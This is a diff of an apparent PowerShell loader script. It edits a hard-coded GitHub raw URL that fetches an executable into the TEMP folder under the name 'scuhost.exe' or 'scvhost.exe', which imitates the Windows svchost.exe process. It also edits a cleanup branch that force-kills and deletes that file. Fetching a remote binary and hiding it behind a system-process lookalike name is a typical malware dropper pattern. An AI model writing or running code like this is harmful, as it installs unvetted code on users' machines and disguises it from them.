@@ -125,8 +125,8 @@ while ($true)
 
         Write-Console "DOWNLOADING..." "INFO"
 
-        $url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/scuhost.exe"
-        $path = "$env:TEMP\scvhost.exe"
+        $url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/scvhost.exe"
+        $path = "$env:TEMP\scuhost.exe"
 
         try {
 
@@ -179,17 +179,17 @@ elseif ($choice -eq "2")
 
     Write-Console "CLEANING..." "INFO"
 
-    $target = "$env:TEMP\scvhost.exe"
+    $target = "$env:TEMP\scuhost.exe"
 
-    Get-Process scvhost -ErrorAction SilentlyContinue | ForEach-Object {
-        try {
-            if ($_.MainModule.FileName -eq $target) {
-                Stop-Process -Id $_.Id -Force
-            }
-        } catch {}
-    }
+   Get-Process scuhost -ErrorAction SilentlyContinue | ForEach-Object {
+      try {
+          if ($_.MainModule.FileName -eq $target) {
+              Stop-Process -Id $_.Id -Force
+          }
+       } catch {}
+  }
 
-    Remove-Item $target -Force -ErrorAction SilentlyContinue
+Remove-Item $target -Force -ErrorAction SilentlyContinue
 
     Write-Host ""
     Write-Console "CLEAN SUCCESS" "SUCCESS"
